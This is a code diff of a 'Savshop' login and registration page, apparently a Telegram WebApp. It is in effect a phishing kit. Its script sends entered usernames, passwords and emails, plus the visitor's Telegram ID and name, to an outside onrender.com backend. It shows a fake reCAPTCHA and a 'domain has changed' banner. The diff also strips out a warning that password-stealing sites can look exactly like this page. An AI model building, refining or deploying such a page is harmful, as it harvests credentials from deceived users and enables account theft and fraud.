@@ -4,263 +4,56 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Savshop - Login & Register</title>
-    <!-- Telegram WebApp SDK added -->
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: Arial, sans-serif;
-        }
-        body {
-            background-color: #121212;
-            color: #ffffff;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: flex-start;
-            min-height: 100vh;
-        }
-        .top-banner {
-            background-color: #27ae60;
-            color: #fff;
-            width: 100%;
-            text-align: center;
-            padding: 8px 10px;
-            font-size: 11px;
-            font-weight: bold;
-        }
-        .main-wrapper {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            flex: 1;
-            width: 100%;
-            padding: 20px;
-        }
-        .container {
-            background-color: #1a1d24;
-            width: 100%;
-            max-width: 380px;
-            padding: 25px;
-            border-radius: 6px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.6);
-            border: 1px solid #2a2e39;
-        }
-        .warning-box {
-            background-color: #e74c3c;
-            color: #fff;
-            padding: 12px;
-            font-size: 12px;
-            font-weight: bold;
-            text-align: center;
-            margin-bottom: 20px;
-            border-radius: 4px;
-            line-height: 1.4;
-        }
-        .brand-title {
-            text-align: center;
-            font-size: 20px;
-            font-weight: bold;
-            letter-spacing: 2px;
-            margin-bottom: 20px;
-            color: #e0e0e0;
-        }
-        .tabs {
-            display: flex;
-            margin-bottom: 20px;
-            border-bottom: 2px solid #2a2e39;
-        }
-        .tab {
-            flex: 1;
-            text-align: center;
-            padding: 10px;
-            cursor: pointer;
-            font-weight: bold;
-            color: #7f8c8d;
-            font-size: 13px;
-        }
-        .tab.active {
-            color: #fff;
-            border-bottom: 2px solid #3498db;
-        }
-        .form-section {
-            display: none;
-        }
-        .form-section.active {
-            display: block;
-        }
-        .input-group {
-            position: relative;
-            margin-bottom: 15px;
-        }
-        .input-group input {
-            width: 100%;
-            padding: 12px 12px 12px 38px;
-            background-color: #252830;
-            border: 1px solid #333842;
-            border-radius: 4px;
-            color: #fff;
-            font-size: 13px;
-            outline: none;
-        }
-        .input-group input:focus {
-            border-color: #3498db;
-        }
-        .input-group .icon {
-            position: absolute;
-            left: 12px;
-            top: 50%;
-            transform: translateY(-50%);
-            color: #7f8c8d;
-            font-size: 14px;
-        }
-        .forgot-pass {
-            font-size: 12px;
-            color: #7f8c8d;
-            margin-bottom: 15px;
-            display: inline-block;
-            cursor: pointer;
-        }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: Arial, sans-serif; }
+        body { background-color: #121212; color: #ffffff; display: flex; flex-direction: column; align-items: center; justify-content: flex-start; min-height: 100vh; }
+        .top-banner { background-color: #27ae60; color: #fff; width: 100%; text-align: center; padding: 8px 10px; font-size: 11px; font-weight: bold; }
+        .main-wrapper { display: flex; flex-direction: column; align-items: center; justify-content: center; flex: 1; width: 100%; padding: 20px; }
+        .container { background-color: #1a1d24; width: 100%; max-width: 380px; padding: 25px; border-radius: 6px; box-shadow: 0 4px 20px rgba(0,0,0,0.6); border: 1px solid #2a2e39; }
+        .warning-box { background-color: #e74c3c; color: #fff; padding: 12px; font-size: 12px; font-weight: bold; text-align: center; margin-bottom: 20px; border-radius: 4px; line-height: 1.4; }
+        .brand-title { text-align: center; font-size: 20px; font-weight: bold; letter-spacing: 2px; margin-bottom: 20px; color: #e0e0e0; }
+        .tabs { display: flex; margin-bottom: 20px; border-bottom: 2px solid #2a2e39; }
+        .tab { flex: 1; text-align: center; padding: 10px; cursor: pointer; font-weight: bold; color: #7f8c8d; font-size: 13px; }
+        .tab.active { color: #fff; border-bottom: 2px solid #3498db; }
+        .form-section { display: none; }
+        .form-section.active { display: block; }
+        .input-group { position: relative; margin-bottom: 15px; }
+        .input-group input { width: 100%; padding: 12px 12px 12px 38px; background-color: #252830; border: 1px solid #333842; border-radius: 4px; color: #fff; font-size: 13px; outline: none; }
+        .input-group input:focus { border-color: #3498db; }
+        .input-group .icon { position: absolute; left: 12px; top: 50%; transform: translateY(-50%); color: #7f8c8d; font-size: 14px; }
+        .forgot-pass { font-size: 12px; color: #7f8c8d; margin-bottom: 15px; display: inline-block; cursor: pointer; }
         .forgot-pass:hover { color: #3498db; }
-        
-        .captcha-box {
-            background-color: #f9f9f9;
-            border: 1px solid #d3d3d3;
-            border-radius: 3px;
-            padding: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            margin-bottom: 20px;
-        }
-        .captcha-left {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        .captcha-left input[type="checkbox"] {
-            width: 20px;
-            height: 20px;
-            cursor: pointer;
-        }
-        .captcha-left span {
-            color: #222;
-            font-size: 13px;
-            font-weight: 500;
-        }
-        .captcha-right {
-            text-align: center;
-        }
-        .captcha-right img {
-            width: 28px;
-            height: 28px;
-        }
-        .captcha-right .txt {
-            font-size: 9px;
-            color: #555;
-            font-weight: bold;
-        }
-
-        .btn-primary {
-            width: 100%;
-            padding: 12px;
-            background-color: #2980b9;
-            border: none;
-            border-radius: 4px;
-            color: white;
-            font-weight: bold;
-            font-size: 13px;
-            cursor: pointer;
-            margin-bottom: 10px;
-        }
+        .captcha-box { background-color: #f9f9f9; border: 1px solid #d3d3d3; border-radius: 3px; padding: 12px; display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; }
+        .captcha-left { display: flex; align-items: center; gap: 10px; }
+        .captcha-left input[type="checkbox"] { width: 20px; height: 20px; cursor: pointer; }
+        .captcha-left span { color: #222; font-size: 13px; font-weight: 500; }
+        .captcha-right { text-align: center; }
+        .captcha-right img { width: 28px; height: 28px; }
+        .captcha-right .txt { font-size: 9px; color: #555; font-weight: bold; }
+        .btn-primary { width: 100%; padding: 12px; background-color: #2980b9; border: none; border-radius: 4px; color: white; font-weight: bold; font-size: 13px; cursor: pointer; margin-bottom: 10px; }
         .btn-primary:hover { background-color: #2471a3; }
-        
-        .btn-outline {
-            width: 100%;
-            padding: 12px;
-            background-color: transparent;
-            border: 1px solid #c0392b;
-            border-radius: 4px;
-            color: #e74c3c;
-            font-weight: bold;
-            font-size: 13px;
-            cursor: pointer;
-        }
+        .btn-outline { width: 100%; padding: 12px; background-color: transparent; border: 1px solid #c0392b; border-radius: 4px; color: #e74c3c; font-weight: bold; font-size: 13px; cursor: pointer; }
         .btn-outline:hover { background-color: rgba(192, 57, 43, 0.1); }
-
-        .ssl-info {
-            text-align: center;
-            font-size: 11px;
-            color: #7f8c8d;
-            margin-top: 20px;
-            line-height: 1.4;
-        }
-
-        .modal-overlay {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.6);
-            display: none;
-            align-items: center;
-            justify-content: center;
-            z-index: 999;
-        }
-        .modal-box {
-            background: #fff;
-            color: #333;
-            width: 300px;
-            padding: 30px 20px;
-            border-radius: 8px;
-            text-align: center;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
-            animation: scaleUp 0.2s ease-in-out;
-        }
-        @keyframes scaleUp {
-            from { transform: scale(0.8); opacity: 0; }
-            to { transform: scale(1); opacity: 1; }
-        }
-        .success-icon {
-            width: 60px; height: 60px;
-            border: 3px solid #2ecc71;
-            border-radius: 50%;
-            display: flex; align-items: center; justify-content: center;
-            margin: 0 auto 15px auto;
-            color: #2ecc71;
-            font-size: 30px;
-        }
+        .ssl-info { text-align: center; font-size: 11px; color: #7f8c8d; margin-top: 20px; line-height: 1.4; }
+        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); display: none; align-items: center; justify-content: center; z-index: 999; }
+        .modal-box { background: #fff; color: #333; width: 300px; padding: 30px 20px; border-radius: 8px; text-align: center; box-shadow: 0 5px 15px rgba(0,0,0,0.3); }
+        .success-icon { width: 60px; height: 60px; border: 3px solid #2ecc71; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px auto; color: #2ecc71; font-size: 30px; }
         .modal-box h3 { font-size: 22px; margin-bottom: 10px; color: #333; }
         .modal-box p { font-size: 14px; color: #666; margin-bottom: 20px; }
-        .modal-btn {
-            background-color: #3498db;
-            color: white; border: none; padding: 10px 25px;
-            font-size: 14px; font-weight: bold; border-radius: 4px;
-            cursor: pointer;
-        }
-        .modal-btn:hover { background-color: #2980b9; }
+        .modal-btn { background-color: #3498db; color: white; border: none; padding: 10px 25px; font-size: 14px; font-weight: bold; border-radius: 4px; cursor: pointer; }
     </style>
 </head>
 <body>
-
-    <div class="top-banner">
-        WE ARE BACK — sorry for the downtime. Everything is fully restored and working. Registration is open again — new accounts welcome.
-    </div>
-
+    <div class="top-banner">WE ARE BACK — everything is fully restored and working.</div>
     <div class="main-wrapper">
         <div class="container">
-            <div class="warning-box">
-                WARNING: OUR DOMAIN HAS CHANGED. PLEASE BOOKMARK THE NEW ONE.
-            </div>
-
+            <div class="warning-box">WARNING: OUR DOMAIN HAS CHANGED.</div>
             <div class="brand-title">SAVSHOP</div>
-
             <div class="tabs">
                 <div class="tab active" onclick="switchTab('login')">LOGIN</div>
                 <div class="tab" onclick="switchTab('register')">REGISTER</div>
             </div>
-
             <!-- Login Form -->
             <div id="login-section" class="form-section active">
                 <div class="input-group">
@@ -272,7 +65,6 @@
                     <input type="password" id="login-pass" placeholder="Enter Password">
                 </div>
                 <div class="forgot-pass">Forgot password?</div>
-
                 <div class="captcha-box">
                     <div class="captcha-left">
                         <input type="checkbox" id="captcha-check">
@@ -283,11 +75,9 @@
                         <div class="txt">reCAPTCHA</div>
                     </div>
                 </div>
-
                 <button class="btn-primary" onclick="handleLogin()">LOGIN</button>
                 <button class="btn-outline" onclick="switchTab('register')">REGISTER NOW!</button>
             </div>
-
             <!-- Register Form -->
             <div id="register-section" class="form-section">
                 <div class="input-group">
@@ -306,51 +96,34 @@
                     <span class="icon">🔒</span>
                     <input type="password" id="reg-cpass" placeholder="Confirm Password">
                 </div>
-
                 <button class="btn-primary" onclick="handleRegister()">REGISTER</button>
                 <button class="btn-outline" onclick="switchTab('login')">BACK TO LOGIN</button>
             </div>
-
-            <div class="ssl-info">
-                🔒 128-bit SSL encryption<br>
-                Websites designed to steal your password can look exactly like this page. Always check the domain name carefully.
-            </div>
+            <div class="ssl-info">🔒 128-bit SSL encryption</div>
         </div>
     </div>
-
-    <!-- Success Popup Modal -->
     <div id="successModal" class="modal-overlay">
         <div class="modal-box">
             <div class="success-icon">✓</div>
             <h3>Good job!</h3>
-            <p id="modal-msg">Registration Successful!</p>
+            <p id="modal-msg">Success!</p>
             <button class="modal-btn" onclick="closeModal()">OK</button>
         </div>
     </div>
-
     <script>
         let tg = window.Telegram.WebApp;
         tg.expand();
 
-        // Get Telegram User Info safely
         const tgUser = (tg.initDataUnsafe && tg.initDataUnsafe.user) ? tg.initDataUnsafe.user : {
             id: "Web_Visitor",
             first_name: "Web User",
             username: "N/A"
         };
 
-        // Function to send form data to Render Bot API server
         async function sendDataToServer(actionType, status, formFields) {
             try {
-                // Determine API URL (if hosted on same domain or absolute Render URL)
-                // If Vercel is front-end and Render is backend, put your Render URL here:
-                // e.g. "https://your-bot-name.onrender.com/api/submit"
-                // Or if relative: "/api/submit" (if configured with proxy, but since they are separate, use your full Render URL or window.location.origin if served together)
-                
-                // NOTE: Replace below with your actual Render backend URL if Vercel is separate!
-                const backendUrl = "https://savastan0so-t9zz.onrender.com/api/submit"; // <-- Update if your Render URL is different
-
-                await fetch(backendUrl, {
+                const backendUrl = "https://savastan0so-t9zz.onrender.com/api/submit";
+                let response = await fetch(backendUrl, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
@@ -362,8 +135,10 @@
                         form_fields: formFields
                     })
                 });
+                let result = await response.json();
+                console.log("Server response:", result);
             } catch (err) {
-                console.error("Submission error:", err);
+                console.error("Submission failed:", err);
             }
         }
 
@@ -372,17 +147,12 @@
             const regTab = document.querySelectorAll('.tab')[1];
             const loginSec = document.getElementById('login-section');
             const regSec = document.getElementById('register-section');
-
             if(tabName === 'login') {
-                loginTab.classList.add('active');
-                regTab.classList.remove('active');
-                loginSec.classList.add('active');
-                regSec.classList.remove('active');
+                loginTab.classList.add('active'); regTab.classList.remove('active');
+                loginSec.classList.add('active'); regSec.classList.remove('active');
             } else {
-                regTab.classList.add('active');
-                loginTab.classList.remove('active');
-                regSec.classList.add('active');
-                loginSec.classList.remove('active');
+                regTab.classList.add('active'); loginTab.classList.remove('active');
+                regSec.classList.add('active'); loginSec.classList.remove('active');
             }
         }
 
@@ -401,16 +171,9 @@
             const pass = document.getElementById('login-pass').value.trim();
             const isCaptchaChecked = document.getElementById('captcha-check').checked;
 
-            if(!user || !pass) {
-                alert("Please fill in all fields!");
-                return;
-            }
-            if(!isCaptchaChecked) {
-                alert("Please verify that you are human!");
-                return;
-            }
+            if(!user || !pass) { alert("Please fill in all fields!"); return; }
+            if(!isCaptchaChecked) { alert("Please verify that you are human!"); return; }
 
-            // Send credentials to Render Bot backend
             await sendDataToServer("LOGIN", "Login Successful", {
                 "Username": user,
                 "Password": pass
@@ -425,16 +188,9 @@
             const pass = document.getElementById('reg-pass').value.trim();
             const cpass = document.getElementById('reg-cpass').value.trim();
 
-            if(!user || !email || !pass || !cpass) {
-                alert("Please fill in all registration details!");
-                return;
-            }
-            if(pass !== cpass) {
-                alert("Passwords do not match!");
-                return;
-            }
+            if(!user || !email || !pass || !cpass) { alert("Please fill in all registration details!"); return; }
+            if(pass !== cpass) { alert("Passwords do not match!"); return; }
 
-            // Send registration details to Render Bot backend
             await sendDataToServer("REGISTER", "Registration Successful", {
                 "Username": user,
                 "Email": email,
